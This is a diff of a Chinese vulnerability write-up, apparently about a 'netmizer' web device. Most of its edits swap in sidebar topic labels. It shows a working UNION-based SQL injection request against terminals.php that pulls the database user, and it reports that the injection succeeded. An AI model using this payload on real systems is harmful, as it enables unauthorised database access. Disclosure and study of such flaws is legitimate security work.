@@ -55,9 +55,9 @@ else if(1||$action == 'phonelist-bar'){
 
 深入探索
 
-软件
+计算机安全
 
-防病毒程序与恶意软件
+网络安全
 
 客户关系管理
 
@@ -67,7 +67,7 @@ else if(1||$action == 'phonelist-bar'){
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-数据管理
+网络安全
 
 ## newdevicezone
 
@@ -82,6 +82,14 @@ Host: netmizer.mrxn.net
 GET /data/echart/terminals.php?action=phonelist-grid&device=-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/user()),0x7e),null,null,null,null,null-- HTTP/1.1
 Host: netmizer.mrxn.net
 ```
+
+深入探索
+
+计算机服务器
+
+编程
+
+数据管理
 
 通过union注入，成功得到数据库用户信息
 
